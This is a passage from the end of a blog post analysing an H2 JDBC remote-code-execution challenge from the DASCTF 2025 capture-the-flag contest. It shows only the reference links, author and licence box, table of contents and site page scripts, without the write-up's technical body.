+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a class="link" target="_blank" rel="noopener" href="https://forum.butian.net/share/2569#/">https://forum.butian.net/share/2569#/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6#/">https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6#/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html#/">https://www.leavesongs.com/PENETRATION/talk-about-h2database-rce.html#/<i class="fas fa-external-link-alt"></i></a><br><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/laMT4-M00t8xAY_Autdb3Ahttps://forum.butian.net/share/1233#/">https://mp.weixin.qq.com/s/laMT4-M00t8xAY_Autdb3Ahttps://forum.butian.net/share/1233#/<i class="fas fa-external-link-alt"></i></a>)</p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                2025-DASCTF 2025上半年赛-泽西岛(H2 JDBC RCE漏洞分析)
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/06/23/泽西岛/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    Author
+                </div>
+                <div class="content">follycat</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    Published
+                </div>
+                <div class="content">2025-06-23 22:50</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    License
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="Copy copyright info" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="Share to WeChat"
+            data-tooltip-img-tip="Scan by WeChat"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/06/23/Geoserver%E6%9C%AA%E6%8E%88%E6%9D%83XXE(CVE-2025-30220)%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/"
+                                   title="Geoserver未授权XXE(CVE-2025-30220)漏洞代码分析"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Geoserver未授权XXE(CVE-2025-30220)漏洞代码分析</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;Comments
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">Comment plugin failed to load</span>
+    <button class="reload keep-button">Click to reload</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">Loading comment plugin</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="configuration-items-error-tip border-box">
+    <i class="fa-solid fa-circle-exclamation"></i>
+    Please fill in the required configuration items for Valine comment plugin
+</div>
+
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%89%B4%E6%9D%83"><span class="nav-text">绕过鉴权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#H2-JDBC-RCE%E5%8E%9F%E7%90%86-payload%E6%9E%84%E9%80%A0"><span class="nav-text">H2 JDBC RCE原理+payload构造</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#H2-JDBC-RCE-%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="nav-text">H2 JDBC RCE \绕过原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84payload"><span class="nav-text">反射payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">follycat</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">Unique Visitor</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">Page View</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E9%89%B4%E6%9D%83"><span class="nav-text">绕过鉴权</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#H2-JDBC-RCE%E5%8E%9F%E7%90%86-payload%E6%9E%84%E9%80%A0"><span class="nav-text">H2 JDBC RCE原理+payload构造</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#H2-JDBC-RCE-%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="nav-text">H2 JDBC RCE \绕过原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84payload"><span class="nav-text">反射payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-text">参考文章</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
